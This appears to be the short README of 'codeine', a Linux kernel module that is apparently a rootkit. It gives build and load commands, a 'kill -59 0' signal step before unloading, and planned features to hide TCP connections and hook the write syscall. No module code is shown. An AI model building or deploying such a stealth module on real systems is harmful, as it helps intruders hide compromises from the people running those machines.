<pre>
 .o88b.  .d88b.  d8888b. d88888b d888888b d8b   db d88888b 
d8P  Y8 .8P  Y8. 88  `8D 88'       `88'   888o  88 88'     
8P      88    88 88   88 88ooooo    88    88V8o 88 88ooooo 
8b      88    88 88   88 88~~~~~    88    88 V8o88 88~~~~~ 
Y8b  d8 `8b  d8' 88  .8D 88.       .88.   88  V888 88.     
 `Y88P'  `Y88P'  Y8888D' Y88888P Y888888P VP   V8P Y88888P 
 </pre>

<h1>Install</h1>

 ```
make
insmod codeine.ko
``` 

<h1>Uninstall</h1>

 ```
kill -59 0
rmmod codeine
``` 

<h1>To do</h1>
<li>Hide TCP connections</li>
<li>Hook write syscall</li>
